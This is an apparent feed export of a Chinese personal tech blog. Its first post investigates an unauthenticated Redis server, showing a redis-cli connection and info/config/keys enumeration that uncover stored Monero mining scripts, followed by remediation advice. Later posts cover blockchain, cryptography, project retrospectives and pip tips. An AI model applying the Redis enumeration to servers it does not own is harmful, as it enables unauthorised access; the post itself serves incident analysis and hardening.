    <content type="html"><![CDATA[<div class="note note-warning">            <p>申明：本地测试为授权操作，请遵守法律，切勿对网站进行未授权的恶意攻击渗透</p>          </div><h1 id="关于Redis未授权访问漏洞引发挖矿漏洞的渗透经历"><a href="#关于Redis未授权访问漏洞引发挖矿漏洞的渗透经历" class="headerlink" title="关于Redis未授权访问漏洞引发挖矿漏洞的渗透经历"></a>关于Redis未授权访问漏洞引发挖矿漏洞的渗透经历</h1><h2 id="漏洞：Redis未授权访问漏洞及门罗币挖矿漏洞"><a href="#漏洞：Redis未授权访问漏洞及门罗币挖矿漏洞" class="headerlink" title="漏洞：Redis未授权访问漏洞及门罗币挖矿漏洞"></a>漏洞：Redis未授权访问漏洞及门罗币挖矿漏洞</h2><h2 id="1-测试条件：建议本地测试-源码安装开源项目"><a href="#1-测试条件：建议本地测试-源码安装开源项目" class="headerlink" title="1.测试条件：建议本地测试 源码安装开源项目"></a>1.测试条件：建议本地测试 源码安装开源项目</h2><p>漏洞存在的原因是服务器开放redis服务，6379端口打开，且未设置数据库访问密码；<br>攻击者可以任意连接，攻击者通过连接redis服务，在有root权限启动redis服务的情况下，<br>使用特殊指令能够修改服务器密钥或者运行恶意脚本，达到植入挖矿脚本等目的</p><h2 id="2-细节："><a href="#2-细节：" class="headerlink" title="2.细节："></a>2.细节：</h2><p>通过任意pc端，安装redis-cli；<br>在redis目录命令行输入redis-cli -h  ip -p 端口连接到该服务器redis服务（本地测试）；<br><img src="/img/redis_login.png"><br>成功连接redis服务，接下来查看redis中存储的内容；</p><h3 id="2-1-输入info获取服务器敏感信息"><a href="#2-1-输入info获取服务器敏感信息" class="headerlink" title="2.1 输入info获取服务器敏感信息"></a>2.1 输入info获取服务器敏感信息</h3><p><img src="/img/redis_info.png"></p><h3 id="2-2-输入config命令；"><a href="#2-2-输入config命令；" class="headerlink" title="2.2 输入config命令；"></a>2.2 输入config命令；</h3><p><img src="/img/redis_eg.png"></p><h3 id="2-3-尝试查看redis数据库存储内容；"><a href="#2-3-尝试查看redis数据库存储内容；" class="headerlink" title="2.3 尝试查看redis数据库存储内容；"></a>2.3 尝试查看redis数据库存储内容；</h3><p><img src="/img/redis_keys.png"><br>发现异常脚本存储backup等；<br><img src="/img/novel_shell.png"><br>此处仔细查看发现他们的格式都很整齐一致，一开始我以为只是简单的指令，可是明明没有root权限；<br>为何要在redis里面存储需要用到root权限的shell脚本，本身数据库存脚本就已经很可疑了。</p><p>这时候谷歌大法好，搜索一波，发现有类似利用漏洞手段，门罗币挖矿相关的；<br><img src="/img/lost_keys.png"><br>发现上面的backup和网络中出现的一模一样，即使他用oracle做障眼法，还是难逃法眼。<br><img src="/img/wakuang.png"></p><p>———————————–END——————————————–</p><h2 id="3-结论"><a href="#3-结论" class="headerlink" title="3.结论"></a>3.结论</h2><p>漏洞已被利用，且脚本可能不定时自动运行，进行门罗币挖矿；<br>可利用“top”指令查看cpu占用率，查看是否有异常进程。</p><h2 id="4-修复建议："><a href="#4-修复建议：" class="headerlink" title="4.修复建议："></a>4.修复建议：</h2><p>删除挖矿脚本，杀死异常进程；<br>删除多余的ssh密钥；<br>重装redis服务，设置严格密码，关闭6379端口；<br>以下为网络对该漏洞修复提供的建议：</p><h2 id="5-相关博客"><a href="#5-相关博客" class="headerlink" title="5.相关博客"></a>5.相关博客</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.cnblogs.com/Cl0ud/p/13873085.html">https://www.cnblogs.com/Cl0ud/p/13873085.html</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
      <tag>Database</tag>
      
      <tag>Redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学笔记|ECC椭圆曲线密码</title>
    <link href="/2022/03/20/ECC%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81/"/>
    <url>/2022/03/20/ECC%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h2 id="原理概述："><a href="#原理概述：" class="headerlink" title="原理概述："></a>原理概述：</h2><p><img src="/img/ecc.png"></p><p><img src="/img/eccflow.png"></p><h2 id="相关视频："><a href="#相关视频：" class="headerlink" title="相关视频："></a>相关视频：</h2><p><a href="https://www.bilibili.com/video/BV1v44y1b7Fd?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1v44y1b7Fd?spm_id_from=333.999.0.0</a></p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链开发||一个最简单Dapp的实现</title>
    <link href="/2022/03/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95Dapp%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <url>/2022/03/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95Dapp%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h1><h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h1 id="智能合约开发"><a href="#智能合约开发" class="headerlink" title="智能合约开发"></a>智能合约开发</h1><h1 id="最终实现效果"><a href="#最终实现效果" class="headerlink" title="最终实现效果"></a>最终实现效果</h1><h1 id="github链接"><a href="#github链接" class="headerlink" title="github链接"></a>github链接</h1>]]></content>
    
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
      <tag>区块链开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链开发之Nuls链的部署和相关知识</title>
    <link href="/2022/03/19/Nuls%E9%93%BE%E7%9A%84%E9%83%A8%E7%BD%B2%E5%92%8C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/03/19/Nuls%E9%93%BE%E7%9A%84%E9%83%A8%E7%BD%B2%E5%92%8C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="区块链软件工程课程"><a href="#区块链软件工程课程" class="headerlink" title="区块链软件工程课程"></a>区块链软件工程课程</h1><p>由于本学期选了区块链软件工程这个课，所以开始接触coderchain这个项目，尽管老师将项目源码开放了，但是很多技术细节我还不是懂不明白<br>跟前面讲的FISCO BCOS一样，一脸懵逼。接下来我会记录跑这个项目，以及添加自己的代码模块的过程。</p><h1 id="NULS链的部署"><a href="#NULS链的部署" class="headerlink" title="NULS链的部署"></a>NULS链的部署</h1><p>我们用到chainbox</p><h2 id="Chainbox"><a href="#Chainbox" class="headerlink" title="Chainbox"></a>Chainbox</h2><p>ChainBox是一个快速搭建区块链的工具，封装了账本，账户，交易，区块，共识，网络六个底层模块，屏蔽了分布式数据存储、点对点传输、共识机制、加密算法等复杂区块链技术，<br>开发者可使用它实现分钟级搭建TPS达1000的基础链，或根据标准通信协议开发业务模块，然后通过chainbox驱动组成一条全新的应用链</p><h2 id="Chainbox的特点"><a href="#Chainbox的特点" class="headerlink" title="Chainbox的特点"></a>Chainbox的特点</h2><p>NULS ChainBox本质上是NULS2.0的一个扩展应用，它的定位是一站式区块链开发平台，它有3个核心特点：</p><ol><li>快速搭建开发环境</li><li>通过模板降低应用开发门槛</li><li>通过约定和脚本降低模板集成的难度，实现一键生成可运行程序</li></ol><h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>1.对于MAVEN不熟悉：用到chainbox，但是我在部署时候jdk，maven成功之后，还是出现了运行脚本无法成功或者时间太长的问题<br>这里可能是网络问题，耐心等待下，不过这些小点对我熟悉coderchain项目有点阻碍<br>2.环境变量设置错误：发现一个是我把环境变量设置错了，导致在./tools -p example运行以及./cmd运行时候出现JAVA_HOME 环境未配置等问题<br><img src="/img/jdk.png"><br>这里jdk应该换成java，拼写错误。。。</p><p>3.对于不熟悉chainbox的读者，简单来讲，chainbox就是一个有点像FISCO BCOS的控制台，使得区块链的操作更简便<br>4.执行到钱包开始运行以及进入NULS V2 CLI时，我不知道下一步是如何操作<br><img src="/img/wallet.png"><br><img src="/img/cli.png"><br>且我安装的服务器是命令行的形式，没有GUI，这就很伤。。。（因为这门课课程给的指导文件说是尽量用GUI，我傻傻的相信了。。。）</p><h3 id="Github无法访问的解决方法"><a href="#Github无法访问的解决方法" class="headerlink" title="Github无法访问的解决方法"></a>Github无法访问的解决方法</h3><p>不知道为啥即使我的外主机能访问github，虚拟机却无法顺利的git clone<br>这时候你可以选择将github项目clone到你自己的gitee主页，之后再讲git地址修改为你的gitee地址<br>！！！注意：所有包含github地址的配置文件，都可以这么修改！！！</p><h2 id="其他的疑问："><a href="#其他的疑问：" class="headerlink" title="其他的疑问："></a>其他的疑问：</h2><h3 id="区块链基本操作的执行"><a href="#区块链基本操作的执行" class="headerlink" title="区块链基本操作的执行"></a>区块链基本操作的执行</h3><h3 id="NULS链"><a href="#NULS链" class="headerlink" title="NULS链"></a>NULS链</h3><h3 id="FISCO-BCO的资产注册-用户登录-交易是如何执行的？"><a href="#FISCO-BCO的资产注册-用户登录-交易是如何执行的？" class="headerlink" title="FISCO BCO的资产注册 用户登录 交易是如何执行的？"></a>FISCO BCO的资产注册 用户登录 交易是如何执行的？</h3><h3 id="智能合约编写后如何通过java代码与链交互-用到接口-接口是如何实现的？"><a href="#智能合约编写后如何通过java代码与链交互-用到接口-接口是如何实现的？" class="headerlink" title="智能合约编写后如何通过java代码与链交互 用到接口 接口是如何实现的？"></a>智能合约编写后如何通过java代码与链交互 用到接口 接口是如何实现的？</h3><h3 id="对比之下，两条链的底层有什么区别？"><a href="#对比之下，两条链的底层有什么区别？" class="headerlink" title="对比之下，两条链的底层有什么区别？"></a>对比之下，两条链的底层有什么区别？</h3><center>如有任何问题可发邮件联系我 </center><center>联系方式：kitescat@foxmail.com </center><center>欢迎关注我的个人公众号：打代码的猫</center><p><img src="/img/debug.jpg"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AAGrid-基于区块链的智能电网分布式认证与授权协议</title>
    <link href="/2022/03/15/AAGrid/"/>
    <url>/2022/03/15/AAGrid/</url>
    
    <content type="html"><![CDATA[<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>本篇我们讲解一篇论文“Distributed Blockchain-Based Authentication and Authorization Protocol for Smart Grid”<br>翻译成中文是：基于区块链的智能电网分布式认证与授权协议<br>我们将通过六个部分讲解这篇论文，包含介绍，贡献，实验，结论等；并对这篇论文的实验进行了初步的复现。</p><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1.Introduction"></a>1.Introduction</h2><h3 id="Smart-Grid-智能电网：传统的电网目前正沿着成为电力信息和通信网络的方向发展。"><a href="#Smart-Grid-智能电网：传统的电网目前正沿着成为电力信息和通信网络的方向发展。" class="headerlink" title="Smart Grid 智能电网：传统的电网目前正沿着成为电力信息和通信网络的方向发展。"></a>Smart Grid 智能电网：传统的电网目前正沿着成为电力信息和通信网络的方向发展。</h3><p><img src="/img/smartgrid.png"><br>智能电网的特点：1.供应商和用户可以实时动态调整电力传输；<br>               2.实现自我修复和自我恢复能力；<br>               3.提高可持续性和效率。</p><h3 id="Authentication-认证：实际就是一个登录和注册的过程"><a href="#Authentication-认证：实际就是一个登录和注册的过程" class="headerlink" title="Authentication 认证：实际就是一个登录和注册的过程"></a>Authentication 认证：实际就是一个登录和注册的过程</h3><h4 id="Authorization-授权：授予某种访问或操作权限："><a href="#Authorization-授权：授予某种访问或操作权限：" class="headerlink" title="Authorization 授权：授予某种访问或操作权限："></a>Authorization 授权：授予某种访问或操作权限：</h4><pre><code class="hljs">            确定用户授权成功后允许执行哪些操作和功能            一种建立对资源的访问的方法，例如功率、计算能力或网络带宽。授权协议还可以处理用户在系统或网络上的权限，包括一个特定的用户是否完全可以访问该系统。流程：可以通过在电力信息管理系统中提供正确的用户名/-密码来验证电力用户的身份。一旦用户经过身份验证，电力服务提供商定义了用户权限的访问策略，是否可以进一步授权他们执行各种功能</code></pre><h3 id="区块链的类型：根据访问机制分为"><a href="#区块链的类型：根据访问机制分为" class="headerlink" title="区块链的类型：根据访问机制分为"></a>区块链的类型：根据访问机制分为</h3><pre><code class="hljs">公有链：BTC、ETH 私有链：以太坊私链联盟链：FISCO BCOS，Hyperledger Fabric</code></pre><p><img src="/img/chaintype.png"></p><h3 id="我们使用的平台：FISCO-BCOS（type：联盟链）"><a href="#我们使用的平台：FISCO-BCOS（type：联盟链）" class="headerlink" title="我们使用的平台：FISCO BCOS（type：联盟链）"></a>我们使用的平台：FISCO BCOS（type：联盟链）</h3><p>相关链接：<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/installation.html">https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/installation.html</a></p><h2 id="2-Motivation"><a href="#2-Motivation" class="headerlink" title="2.Motivation"></a>2.Motivation</h2><p>电网中出现的问题：<br>（1）中心化监督成本高<br>（2）信任问题<br>（3）信息安全问题</p><h2 id="3-Contributions"><a href="#3-Contributions" class="headerlink" title="3.Contributions"></a>3.Contributions</h2><p>（1）提出了一种基于区块链的分布式认证和授权协议<br>（2）第一个使用联盟区块链技术构建的A&amp;A协议<br>（3）通过算法来维护和记录智能合同，演示了一种使用FISCO平台实际部署我们的A&amp;A协议的方法</p><h2 id="4-Procedure"><a href="#4-Procedure" class="headerlink" title="4.Procedure"></a>4.Procedure</h2><h3 id="A1分布式认证：登录和注册"><a href="#A1分布式认证：登录和注册" class="headerlink" title="A1分布式认证：登录和注册"></a>A1分布式认证：登录和注册</h3><p><img src="/img/A1.jpg"></p><h3 id="A2分布式授权：资源注册和授权"><a href="#A2分布式授权：资源注册和授权" class="headerlink" title="A2分布式授权：资源注册和授权"></a>A2分布式授权：资源注册和授权</h3><p><img src="/img/A2.jpg"></p><h2 id="5-Experiment"><a href="#5-Experiment" class="headerlink" title="5.Experiment"></a>5.Experiment</h2><p>其中我们选择Fisco Bcos作为我们运行的平台，已有开发完善的JDK 接口，因此开发方便<br>源程序包括协议运行的由java编写的app以及实验程序</p><p>运行程序需首先部署Fisco链，运行节点。git下载项目源代码之后，用gradle build，<br>进入项目dist目录中，使用java -cp运行,具体请到github主页查看！</p><h3 id="实验结果："><a href="#实验结果：" class="headerlink" title="实验结果："></a>实验结果：</h3><h4 id="A1"><a href="#A1" class="headerlink" title="A1:"></a>A1:</h4><p><img src="/img/A1Exp1.jpg"><br><img src="/img/A1Exp2.png"><br><img src="/img/A1Exp3.png"></p><h4 id="A2"><a href="#A2" class="headerlink" title="A2:"></a>A2:</h4><p><img src="/img/A2Exp1.jpg"><br><img src="/img/A2Exp2.jpg"></p><h2 id="6-Conclusion"><a href="#6-Conclusion" class="headerlink" title="6.Conclusion"></a>6.Conclusion</h2><p>（1）协议安全可靠<br>（2）部署和实验证明协议的效率高<br>（3）未来方向：将区块链技术用于智能电网的数据统计与资源计算；<br>        对于分布式授权功能，加入角色访问控制<br>        对于数据加密协议，引入同态加密等方法</p><p>程序源代码链接：<a href="https://github.com/humuchuang/AAGrid">https://github.com/humuchuang/AAGrid</a> 或 <a href="https://gitee.com/kitescat/AAGrid">https://gitee.com/kitescat/AAGrid</a></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><center>如有任何问题可发邮件联系我 </center><center>联系方式：kitescat@foxmail.com </center><center>欢迎关注我的个人公众号：打代码的猫</center><p><img src="/img/debug.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>论文阅读</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
      <tag>区块链开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>開山漏洞扫描器 || tkscanner</title>
    <link href="/2021/03/25/tkscanner-1/"/>
    <url>/2021/03/25/tkscanner-1/</url>
    
    <content type="html"><![CDATA[<h2 id="tkscanner：面向web应用的漏洞扫描器"><a href="#tkscanner：面向web应用的漏洞扫描器" class="headerlink" title="tkscanner：面向web应用的漏洞扫描器"></a>tkscanner：面向web应用的漏洞扫描器</h2><p>记录一下web漏扫器的开发进度，目前已经写了一点简单的界面</p><h3 id="一、界面展示"><a href="#一、界面展示" class="headerlink" title="一、界面展示"></a>一、界面展示</h3><ol><li>登录界面<br><img src="/img/tk1.png"> </li><li>导航栏<br><img src="/img/tk2.png"></li><li>url输入框<br><img src="/img/tk3.png"></li><li>主页整体一览<br><img src="/img/tk4.png"></li></ol><p>   </p><h3 id="二、接下来可能遇到的困难："><a href="#二、接下来可能遇到的困难：" class="headerlink" title="二、接下来可能遇到的困难："></a>二、接下来可能遇到的困难：</h3><ol><li>爬虫和漏洞检测代码的实现 </li><li>其中redis我没接触过  </li><li>还有多线程和celery异步队列啥的，听起来还是很高深啊。不知道后面会怎么实现  </li><li>前端界面如何优化：Bootstrap框架的学习</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全，漏洞扫描</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>项目复盘（二）||innovation-LDA</title>
    <link href="/2021/03/25/%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%EF%BC%88%E4%BA%8C%EF%BC%89-innovation-LDA/"/>
    <url>/2021/03/25/%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%EF%BC%88%E4%BA%8C%EF%BC%89-innovation-LDA/</url>
    
    <content type="html"><![CDATA[<h2 id="项目复盘（二）-innovation-LDA"><a href="#项目复盘（二）-innovation-LDA" class="headerlink" title="项目复盘（二）||innovation-LDA"></a>项目复盘（二）||innovation-LDA</h2><p>大创项目：基于Innovation-LDA的企业创新社区文本主题发现研究<br>时间：2019.11-2020.4  <br>由于复试需要复盘我的项目，想在就简单梳理一遍</p><h3 id="一、目的："><a href="#一、目的：" class="headerlink" title="一、目的："></a>一、目的：</h3><p>对小米社区的帖子进行分析，利用基于LDA原型算法改进的inno-LDA算法，提取帖子中的主题</p><h3 id="二、输入和输出"><a href="#二、输入和输出" class="headerlink" title="二、输入和输出"></a>二、输入和输出</h3><ol><li>数据来源：小米社区的数据  （不同时间段的）  </li><li>爬虫：已经有的数据 有不同时间段的帖子 每份大概3w条  <br>由于是老师提供的数据，都输出在excel里了，就没去仔细研究爬虫了<br>数据如图：<br><img src="/img/dataoflda.png"> </li><li>输出：每个算法程序的输出为每个帖子对应的主题 </li></ol><p>  例如帖子1：    </p><pre><code class="hljs">标题：单手模式改进意见_新功能建议_MIUI论坛        内容：单手模式能不能把显示区域居中靠右或者靠左...  输出为主题：单手模式   </code></pre><ol start="4"><li>实现：我们实现的lda类模型有LDA,local_LDA,sent_LDA,inno_LDA四种。  <br>我负责的是sent_lda。</li></ol><h3 id="三、方法和原理"><a href="#三、方法和原理" class="headerlink" title="三、方法和原理"></a>三、方法和原理</h3><p>LDA算法的原理：<br>Blei D M, Ng A Y, Jordan M I. Latent dirichlet allocation[J]. Journal of Machine Learning Research, 2012, 3:993-1022.</p><p>吉布斯采样和EM变分算法的区别：</p><p>Inno-LDA的原理：<br>local_LDA的原理：<br>出自论文：Brody S, Elhadad N. An unsupervised aspect-sentiment model for online reviews<br>sent_lda算法的原理：</p><h3 id="四、主要负责什么工作"><a href="#四、主要负责什么工作" class="headerlink" title="四、主要负责什么工作"></a>四、主要负责什么工作</h3><p>Sent-lda的输入脚本开发<br>数据清洗，用正则表达式 比如繁体 字母大小写 特殊字符<br>正则表达式哪些比较好用？特殊<br>中文分词 用的是百度的jieba分词<br>自定义字典 对一些特定的专业词汇自定义分词<br>数据展示：困惑度整合成条形图，词云跑过主题图<br>Sent-lda算法的复现（这个没做）<br>lda主题算法和其他变形讲解？</p><h3 id="五、遇到的问题如何解决"><a href="#五、遇到的问题如何解决" class="headerlink" title="五、遇到的问题如何解决"></a>五、遇到的问题如何解决</h3><p>有些参数上的错误，造成算法错误<br>困惑度的计算<br>多线程跑，数据量大<br>我自己遇到的问题：一开始需要我复现输入脚本的代码，我就去读论文。但是似乎需要固定的格式作者没给出。就通读了下算法变形的地方，在我们复现的lda上做修改。不过最后找到原作者用到了他的脚本和软件。<br>感谢来自上交的鲍杨老师提供了脚本：<br>老师说要避免出现过拟合的现象<br>最后的结果是我们人工标记打分主题的匹配程度，inno-lda优于lda，但sentlda可能更好，具体原因就没再深究，我就结束了我的工作。家里有事加上考研。<br>我自己遇到的问题就是预处理，多个版本总是不一致<br>因为一开始就和原作者那个不一样，所以要修改原作者的脚本和我们的一致才行</p><h3 id="六、参考文献"><a href="#六、参考文献" class="headerlink" title="六、参考文献"></a>六、参考文献</h3>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>项目复盘</tag>
      
      <tag>NLP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>项目复盘（一）||图像处理C#程序</title>
    <link href="/2021/03/25/%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%EF%BC%88%E4%B8%80%EF%BC%89-%E5%9F%BA%E4%BA%8EEmguCV%E7%9A%84%E8%AF%86%E5%88%AB%E5%9B%BE%E5%BD%A2%E4%B8%AD%E5%BF%83%E7%9A%84C-WinForm%E7%A8%8B%E5%BA%8F/"/>
    <url>/2021/03/25/%E9%A1%B9%E7%9B%AE%E5%A4%8D%E7%9B%98%EF%BC%88%E4%B8%80%EF%BC%89-%E5%9F%BA%E4%BA%8EEmguCV%E7%9A%84%E8%AF%86%E5%88%AB%E5%9B%BE%E5%BD%A2%E4%B8%AD%E5%BF%83%E7%9A%84C-WinForm%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="对物体中心检测的-C-窗口程序的复盘"><a href="#对物体中心检测的-C-窗口程序的复盘" class="headerlink" title="对物体中心检测的 C# 窗口程序的复盘"></a>对物体中心检测的 C# 窗口程序的复盘</h1><h2 id="一、目的："><a href="#一、目的：" class="headerlink" title="一、目的："></a>一、目的：</h2><p>测物体的中心输出相对坐标 便于蛋糕机器人喷涂图案</p><h2 id="二、实现的输入和输出"><a href="#二、实现的输入和输出" class="headerlink" title="二、实现的输入和输出"></a>二、实现的输入和输出</h2><h3 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h3><p>照相机照相 光源干扰 反光灯因素如何避免</p><h3 id="对图像中的噪点如何处理？"><a href="#对图像中的噪点如何处理？" class="headerlink" title="对图像中的噪点如何处理？"></a>对图像中的噪点如何处理？</h3><p>加入蛋糕上面有多个圆形怎么办 取最外面的图像 不管是方形还是圆形<br>选择机制 加入轮廓最大的是方形就选择方形中心</p><h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><p>1.圆形的圆心坐标<br>2.方形的中心坐标 </p><h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><p>输出到窗口上面显示相对于图片左上角的相对坐标 便于与现实中喷头的参考系对照   </p><h2 id="三、方法："><a href="#三、方法：" class="headerlink" title="三、方法："></a>三、方法：</h2><p>高斯滤波–&gt;进行灰度处理–&gt;进行二值化–&gt;进行开运算–&gt;轮廓提取–&gt;计算中心点位<br>预处理：高斯滤波 二值化 灰度处理等等均可以<br>应用霍夫变换必须使用二值化图像<br>可以先执行边缘检测再执行霍夫变换<br>1.主要是用边缘检测中的Canny和霍夫变换中的霍夫圆，和线检测<br>2.圆形直接使用霍夫圆变换，方形使用Canny或者霍夫线变换<br>3.共同的方法是使用封装好的FindContours，找到轮廓，之后输入到ApproxPolyDP多边形拟合曲线，识别他是什么形状的，比如三角形，方形，圆形。（图像的矩）<br>4.轮廓优化：最后对于生成的轮廓，可以使用形态学进行优化 例如开运算 </p><h2 id="四、原理和基础知识："><a href="#四、原理和基础知识：" class="headerlink" title="四、原理和基础知识："></a>四、原理和基础知识：</h2><ol><li>高斯滤波filter：线性平滑滤波 为什么叫做高斯：处理高斯噪声 数值上符合正态分布<br>对像素邻域内各像素灰度值加权平均替代中心像素的灰度值<br>对整幅图像像素值进行加权平均，针对每一个像素点的值，都由其本身值和邻域内的其他像素值经过加权平均后得到。 </li><li>灰度处理 BGR2Gray 就是对BGR三个数值进行操作化为灰度值 取平均值 </li><li>图像分割：<br>边缘检测： 检测那些灰度值急剧变化的点<br>平滑滤波 边缘锐化 边缘判定 边缘连接<h3 id="Canny算法-对噪声和边缘检测的折中方案"><a href="#Canny算法-对噪声和边缘检测的折中方案" class="headerlink" title="Canny算法 对噪声和边缘检测的折中方案"></a>Canny算法 对噪声和边缘检测的折中方案</h3>Canny算子的步骤是：</li><li>先进行滤波降噪。</li><li>计算梯度幅值和方向（进行Sobel算子计算）。</li><li>非极大值抑制。将模糊（blurred）的边界变得清晰（sharp）。通俗的讲，就是保留了每个像素点上梯度强度的极大值，而删掉其他的值。</li><li>滞后阈值。设定一个阈值上界和阈值下界（opencv中通常由人为指定的），图像中的像素点如果大于阈值上界则认为必然是边界（称为强边界，strong edge），小于阈值下界则认为必然不是边界，两者之间的则认为是候选项（称为弱边界，weak edge）</li><li>霍夫变换  CvInvoke.HoughCircles HoughLines<br>霍夫圆变换的基本思路是认为图像上每一个非零像素点都有可能是一个潜在的圆上的一点，跟霍夫线变换一样，也是通过投票，生成累积坐标平面，设置一个累积权重来定位圆<br><a href="https://blog.csdn.net/flymoon87/article/details/82830608">https://blog.csdn.net/flymoon87/article/details/82830608</a></li></ol><h3 id="利用霍夫变换"><a href="#利用霍夫变换" class="headerlink" title="利用霍夫变换"></a>利用霍夫变换</h3><p>public static CircleF[] HoughCircles 取数组第一个元素 Center 输出点<br>public static LineSegment2D[] HoughLinesP 取lines 第一个元素 输出点P1  P1为起点<br>霍夫梯度法的缺点<br>&lt;1&gt; 在霍夫梯度法中，使用Sobel导数来计算局部梯度，其可以视作等同于一条局部切线，这不是一个数值稳定的做法。在大多数情况下，这样做会得到正确的结果，但或许会在输出中产生一些噪声。<br>&lt;2&gt; 在边缘图像中的整个非0像素集被看做每个中心的候选部分。因此，如果把累加器的阈值设置偏低，算法将要消耗比较长的时间。第三，因为每一个中心只选择一个圆，如果有同心圆，就只能选择其中的一个。<br>&lt;3&gt; 因为中心是按照其关联的累加器值的升序排列的，并且如果新的中心过于接近之前已经接受的中心的话，就不会被保留下来。且当有许多同心圆或者是近似的同心圆时，霍夫梯度法的倾向是保留最大的一个圆。可以说这是一种比较极端的做法，因为在这里默认Sobel导数会产生噪声，若是对于无穷分辨率的平滑图像而言的话，这才是必须的。</p>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>项目复盘</tag>
      
      <tag>图像处理</tag>
      
      <tag>C#</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pip的一些汇总</title>
    <link href="/2021/03/18/pip%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B1%87%E6%80%BB/"/>
    <url>/2021/03/18/pip%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p>关于pip</p><ol><li>版本造成的问题：<br>Python2与Python3共存<br><a href="https://blog.csdn.net/tingsky9985/article/details/80818617">python中使用pip，提示”Unable to create process using”的解决办法 </a>   </li><li>requirements.txt<br><a href="https://blog.csdn.net/sinat_26809255/article/details/107529736">python快速安装requirements中的安装包</a>  </li><li>镜像加速<br><a href="https://blog.csdn.net/tiny_fisher/article/details/85015465">PYTHON pip 清华镜像</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自学之路|通过优质公众号学习</title>
    <link href="/2021/03/10/learnbygzh/"/>
    <url>/2021/03/10/learnbygzh/</url>
    
    <content type="html"><![CDATA[<h2 id="安全类公众号推荐，如何根据帖子学习技能"><a href="#安全类公众号推荐，如何根据帖子学习技能" class="headerlink" title="安全类公众号推荐，如何根据帖子学习技能"></a>安全类公众号推荐，如何根据帖子学习技能</h2><h3 id="（一）公众号列表"><a href="#（一）公众号列表" class="headerlink" title="（一）公众号列表"></a>（一）公众号列表</h3><p>以下是一些安全公众号的推荐，包含个人公众号以及团队实验室公众号：</p><ol><li>FreeBuf</li><li>绿盟科技安全情报</li><li>i春秋</li><li>火绒安全实验室</li><li>嘶吼专业版 